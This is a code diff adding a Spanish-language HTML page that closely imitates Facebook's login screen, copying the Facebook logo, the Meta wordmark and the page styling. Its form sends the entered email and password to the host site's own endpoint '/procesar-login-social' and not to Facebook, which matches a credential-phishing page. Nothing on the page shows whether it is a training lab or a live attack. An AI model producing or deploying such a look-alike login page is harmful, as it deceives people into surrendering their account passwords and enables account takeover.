@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook - Iniciar sesión</title>
+  <link href="https://fonts.googleapis.com/css2?family=Helvetica+Neue:wght@400;700&family=Inter:wght@300;400;500;700&display=swap" rel="stylesheet"/>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    html, body {
+      overflow: hidden;
+    }
+
+    body {
+      background: #18191a;
+      min-height: 100vh;
+      display: flex;
+      font-family: 'Inter', Helvetica, Arial, sans-serif;
+      color: #e4e6eb;
+    }
+
+    /* ── LADO IZQUIERDO ── */
+    .fb-left {
+      flex: 1;
+      position: relative;
+      overflow: hidden;
+      border-right: 1px solid #3a3b3c;
+      padding: 51px 30px 40px 50px;
+      display: flex;
+      align-items: center;
+    }
+
+    .fb-left-inner {
+      position: relative;
+      width: 100%;
+      height: 580px;
+      max-width: 550px;
+      margin: 0 auto;
+    }
+
+    /* Logo Facebook */
+    .fb-logo {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 52px;
+      height: 52px;
+    }
+
+    /* Tagline */
+    .fb-tagline {
+      position: absolute;
+      top: 80px;
+      left: 0;
+      font-size: 2.8rem;
+      font-weight: 800;
+      line-height: 1.05;
+      color: #e4e6eb;
+      max-width: 240px;
+      z-index: 2;
+    }
+
+    .fb-tagline .highlight {
+      color: #1877f2;
+    }
+
+    /* ── Collage de fotos ── */
+
+    /* Emoji risa - floating top */
+    .collage-emoji {
+      position: absolute;
+      top: 68px;
+      left: 245px;
+      width: 42px;
+      height: 42px;
+      z-index: 6;
+      filter: drop-shadow(0 2px 6px rgba(0,0,0,0.12));
+    }
+
+    .collage-emoji img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: 50%;
+    }
+
+    /* Tarjeta planta (detrás de la foto principal, arriba a la izquierda del collage) */
+    .collage-card-plant {
+      position: absolute;
+      top: 95px;
+      left: 230px;
+      width: 150px;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      z-index: 3;
+      background: #242526;
+    }
+
+    .collage-card-plant img {
+      width: 100%;
+      height: 115px;
+      object-fit: cover;
+    }
+
+    .collage-card-plant-badge {
+      position: absolute;
+      bottom: 6px;
+      left: 8px;
+      width: 20px;
+      height: 20px;
+      background: #65676b;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .collage-card-plant-badge svg {
+      width: 11px;
+      height: 11px;
+      fill: #fff;
+    }
+
+    /* Foto principal: mujer morado (marco de teléfono) */
+    .collage-main {
+      position: absolute;
+      top: 30px;
+      right: 0px;
+      width: 210px;
+      height: 320px;
+      border-radius: 18px;
+      overflow: hidden;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.12);
+      z-index: 4;
+      background: #c4b5d8;
+    }
+
+    .collage-main img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    /* Badge mensaje 16:45 - sobre la foto principal */
+    .collage-wa-badge {
+      position: absolute;
+      top: 42px;
+      right: 14px;
+      z-index: 7;
+      background: #25d366;
+      color: #fff;
+      font-size: 0.68rem;
+      font-weight: 600;
+      padding: 3px 9px 3px 7px;
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      gap: 3px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.18);
+    }
+
+    .collage-wa-badge svg {
+      width: 12px;
+      height: 12px;
+      fill: #fff;
+    }
+
+    /* Segunda tarjeta (landscape/skateboard) */
+    .collage-card-landscape {
+      position: absolute;
+      bottom: 126px;
+      left: 213px;
+      width: 220px;
+      border-radius: 14px;
+      overflow: hidden;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.12);
+      z-index: 5;
+      background: #242526;
+    }
+
+    .collage-card-landscape-badge {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      width: 22px;
+      height: 22px;
+      background: #1877f2;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1;
+    }
+
+    .collage-card-landscape-badge svg {
+      width: 12px;
+      height: 12px;
+      fill: #fff;
+    }
+
+    .collage-card-landscape img {
+      width: 100%;
+      height: 120px;
+      object-fit: cover;
+    }
+
+    .collage-card-landscape-bar {
+      padding: 10px 14px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .dots {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      width: 100%;
+    }
+
+    .dot {
+      width: 9px;
+      height: 9px;
+      border-radius: 50%;
+      border: 1.5px solid #4e4f50;
+    }
+
+    .dot.active {
+      background: #e4e6eb;
+      border-color: #e4e6eb;
+      width: 22px;
+      border-radius: 10px;
+    }
+
+
+
+    /* ── LADO DERECHO ── */
+    .fb-right {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px;
+    }
+
+    .fb-card {
+      padding: 40px;
+      width: 400px;
+      max-width: 95vw;
+      animation: fbFadeIn 0.4s ease;
+      transform: translateY(-38px);
+    }
+
+    @keyframes fbFadeIn {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .fb-card-title {
+      font-size: 1.25rem;
+      font-weight: 700;
+      margin-bottom: 28px;
+      color: #e4e6eb;
+      text-align: center;
+    }
+
+    /* Inputs */
+    .fb-input {
+      width: 100%;
+      background: #3a3b3c;
+      border: 1px solid #4e4f50;
+      border-radius: 8px;
+      padding: 14px 16px;
+      font-size: 0.95rem;
+      color: #e4e6eb;
+      font-family: 'Inter', sans-serif;
+      margin-bottom: 14px;
+      transition: border-color 0.2s;
+    }
+
+    .fb-input:focus {
+      outline: none;
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+    }
+
+    .fb-input::placeholder { color: #b0b3b8; }
+
+    .fb-error {
+      color: #e63946;
+      font-size: 0.8rem;
+      margin-top: -8px;
+      margin-bottom: 12px;
+      display: none;
+    }
+
+    /* Botón principal */
+    .fb-btn-login {
+      width: 100%;
+      background: #1877f2;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 14px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: background 0.2s;
+      margin-top: 4px;
+    }
+
+    .fb-btn-login:hover {
+      background: #166fe5;
+    }
+
+    /* Links */
+    .fb-forgot {
+      display: block;
+      text-align: center;
+      color: #b0b3b8;
+      font-size: 0.88rem;
+      font-weight: 600;
+      margin-top: 18px;
+      text-decoration: none;
+    }
+
+    .fb-forgot:hover { text-decoration: underline; color: #1877f2; }
+
+    .fb-meta-login {
+      display: block;
+      text-align: center;
+      color: #b0b3b8;
+      font-size: 0.85rem;
+      font-weight: 600;
+      margin-top: 14px;
+      text-decoration: none;
+    }
+
+    .fb-meta-login:hover { text-decoration: underline; }
+
+    /* Divider */
+    .fb-divider {
+      border: none;
+      border-top: 1px solid #3a3b3c;
+      margin: 24px 0;
+    }
+
+    /* Crear cuenta */
+    .fb-btn-create {
+      display: block;
+      width: 100%;
+      background: transparent;
+      border: 1px solid #1877f2;
+      color: #1877f2;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 0.95rem;
+      font-weight: 600;
+      cursor: pointer;
+      font-family: 'Inter', sans-serif;
+      transition: all 0.2s;
+      text-align: center;
+      text-decoration: none;
+    }
+
+    .fb-btn-create:hover {
+      background: rgba(24, 119, 242, 0.08);
+    }
+
+    /* Meta logo */
+    .fb-meta {
+      text-align: center;
+      margin-top: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+    }
+
+    .fb-meta svg { width: 90px; height: auto; }
+
+    @media (max-width: 768px) {
+      body { flex-direction: column; }
+      .fb-left { display: none; }
+      .fb-right { padding: 24px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- LADO IZQUIERDO -->
+  <div class="fb-left">
+    <div class="fb-left-inner">
+      <!-- Facebook logo -->
+      <svg class="fb-logo" viewBox="0 0 36 36" fill="#1877f2">
+        <path d="M20.18 35.87C28.87 34.63 35.75 27.14 35.75 18c0-9.94-8.06-18-18-18S-.25 8.06-.25 18c0 8.3 5.62 15.28 13.26 17.35v-12.6H9.35V18h3.66v-3.61c0-3.62 2.16-5.62 5.46-5.62 1.58 0 3.23.28 3.23.28v3.56h-1.82c-1.79 0-2.35 1.11-2.35 2.25V18h4.02l-.64 4.75h-3.38v12.12z"/>
+      </svg>
+
+      <!-- Tagline -->
+      <div class="fb-tagline">
+        Explora<br>las<br>cosas<br>que <span class="highlight">más</span><br><span class="highlight">te</span><br><span class="highlight">gustan.</span>
+      </div>
+
+      <!-- Emoji risa -->
+      <div class="collage-emoji">
+        <img src="/static/img/emoji-risa.jpg" alt="😆"/>
+      </div>
+
+      <!-- Tarjeta planta (detrás de la foto principal) -->
+      <div class="collage-card-plant">
+        <img src="/static/img/planta.jpg" alt="Planta"/>
+        <div class="collage-card-plant-badge">
+          <svg viewBox="0 0 16 16"><path d="M2 3a1 1 0 011-1h2.5a1 1 0 01.7.3L7.3 3.4l.1.1H13a1 1 0 011 1v8a1 1 0 01-1 1H3a1 1 0 01-1-1V3z"/></svg>
+        </div>
+      </div>
+
+      <!-- Badge mensaje 16:45 -->
+      <div class="collage-wa-badge">
+        <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/><path d="M12 2C6.477 2 2 6.477 2 12c0 1.89.525 3.66 1.438 5.168L2 22l4.832-1.438A9.96 9.96 0 0012 22c5.523 0 10-4.477 10-10S17.523 2 12 2z"/></svg>
+        16:45
+      </div>
+
+      <!-- Foto principal: mujer morado (phone frame) -->
+      <div class="collage-main">
+        <img src="/static/img/mujer-morado.jpg" alt="Foto"/>
+      </div>
+
+      <!-- Segunda tarjeta (landscape) -->
+      <div class="collage-card-landscape">
+        <div class="collage-card-landscape-badge">
+          <svg viewBox="0 0 36 36"><path d="M20.18 35.87C28.87 34.63 35.75 27.14 35.75 18c0-9.94-8.06-18-18-18S-.25 8.06-.25 18c0 8.3 5.62 15.28 13.26 17.35v-12.6H9.35V18h3.66v-3.61c0-3.62 2.16-5.62 5.46-5.62 1.58 0 3.23.28 3.23.28v3.56h-1.82c-1.79 0-2.35 1.11-2.35 2.25V18h4.02l-.64 4.75h-3.38v12.12z"/></svg>
+        </div>
+        <img src="/static/img/mujer-amarillo.jpg" alt="Landscape"/>
+        <div class="collage-card-landscape-bar">
+          <div class="dots">
+            <div class="dot active"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- LADO DERECHO -->
+  <div class="fb-right">
+    <form class="fb-card" id="fbForm" method="POST" action="/procesar-login-social">
+      <div class="fb-card-title">Iniciar sesión en Facebook</div>
+
+      <input type="hidden" name="provider" value="facebook"/>
+
+      <input type="email" class="fb-input" id="fbEmail" name="email" placeholder="Correo electrónico o número de móvil" autocomplete="email"/>
+      <div class="fb-error" id="fbEmailError">Introduce una dirección de correo electrónico válida</div>
+
+      <input type="password" class="fb-input" id="fbPass" name="password" placeholder="Contraseña"/>
+      <div class="fb-error" id="fbPassError">La contraseña es obligatoria</div>
+
+      <button type="submit" class="fb-btn-login">Iniciar sesión</button>
+
+      <a href="#" class="fb-forgot">¿Has olvidado la contraseña?</a>
+
+      <hr class="fb-divider"/>
+
+      <a href="/registro" class="fb-btn-create">Crear una cuenta</a>
+
+      <div class="fb-meta">
+        <svg viewBox="0 0 508 108" xmlns="http://www.w3.org/2000/svg">
+          <path d="M71.6 21.8C64.4 21.8 56.2 27.2 49.8 36.6L46 42.4L42.2 36.6C35.8 27.2 27.6 21.8 20.4 21.8C9.2 21.8 0 35.6 0 54C0 72.4 9.2 86.2 20.4 86.2C27.6 86.2 35.8 80.8 42.2 71.4L46 65.6L49.8 71.4C56.2 80.8 64.4 86.2 71.6 86.2C82.8 86.2 92 72.4 92 54C92 35.6 82.8 21.8 71.6 21.8ZM25.4 74.2C18 74.2 13 65.4 13 54C13 42.6 18 33.8 25.4 33.8C30 33.8 35 38.2 39.2 45L46 55.6L39.2 63C35 69.8 30 74.2 25.4 74.2ZM66.6 74.2C62 74.2 57 69.8 52.8 63L46 52.4L52.8 45C57 38.2 62 33.8 66.6 33.8C74 33.8 79 42.6 79 54C79 65.4 74 74.2 66.6 74.2Z" fill="#0081FB"/>
+          <path d="M131.4 25.4H143.8L157.4 62.6L171 25.4H183.2V82H173.2V41.6L160.6 75.4H154.2L141.4 41.6V82H131.4V25.4Z" fill="#b0b3b8"/>
+          <path d="M211.4 83C205 83 200 81 196.2 76.8C192.6 72.8 190.6 67.2 190.6 60.2C190.6 53 192.6 47.4 196.4 43.2C200.2 39 205.2 37 211.2 37C217 37 221.6 39 224.8 42.8C228 46.6 229.6 51.8 229.6 58.4V62H201C201.4 66 202.8 69.2 205.2 71.4C207.6 73.6 210.8 74.6 214.6 74.6C219.6 74.6 224.2 73 228.2 70V78.6C224.2 81.4 219 83 211.4 83ZM211.2 45C208.4 45 206 46 204.2 47.8C202.2 49.8 201.2 52.4 200.8 56H220.4C220.2 52.2 219.2 49.4 217.2 47.6C215.4 45.8 213.4 45 211.2 45Z" fill="#b0b3b8"/>
+          <path d="M253.4 82C247.4 82 243.2 80.2 243.2 73.6V45.8H235V38H243.2V27H253.4V38H264V45.8H253.4V70.6C253.4 73.4 254.8 74.6 257.6 74.6C259.4 74.6 261.4 74 263.6 73V81C261 82 257.4 82 253.4 82Z" fill="#b0b3b8"/>
+          <path d="M295.8 83C289.8 83 284.8 81 281.2 76.8C277.4 72.6 275.6 67 275.6 60C275.6 53 277.4 47.4 281.2 43.2C285 39 289.8 37 295.8 37C300.6 37 304.6 38.6 307.6 41.8V38H317.6V82H307.6V78.2C304.6 81.4 300.6 83 295.8 83ZM298.2 74.2C301.8 74.2 304.6 73 306.8 70.4C309 67.8 310 64.4 310 60C310 55.6 309 52.2 306.8 49.6C304.6 47 301.8 45.8 298.2 45.8C294.6 45.8 291.8 47 289.6 49.6C287.4 52.2 286.4 55.6 286.4 60C286.4 64.4 287.4 67.8 289.6 70.4C291.8 73 294.6 74.2 298.2 74.2Z" fill="#b0b3b8"/>
+        </svg>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById('fbEmail').addEventListener('input', function() {
+      document.getElementById('fbEmailError').style.display = 'none';
+    });
+
+    document.getElementById('fbPass').addEventListener('input', function() {
+      document.getElementById('fbPassError').style.display = 'none';
+    });
+
+    document.getElementById('fbForm').addEventListener('submit', function(e) {
+      let valid = true;
+      const email = document.getElementById('fbEmail').value.trim();
+      const pass = document.getElementById('fbPass').value;
+
+      if (!email || !email.includes('@')) {
+        document.getElementById('fbEmailError').style.display = 'block';
+        valid = false;
+      } else {
+        document.getElementById('fbEmailError').style.display = 'none';
+      }
+
+      if (!pass) {
+        document.getElementById('fbPassError').style.display = 'block';
+        valid = false;
+      } else {
+        document.getElementById('fbPassError').style.display = 'none';
+      }
+
+      if (!valid) e.preventDefault();
+    });
+
+    // Limpiar campos al cargar la página
+    window.addEventListener('pageshow', function() {
+      document.getElementById('fbForm').reset();
+    });
+  </script>
+</body>
+</html>
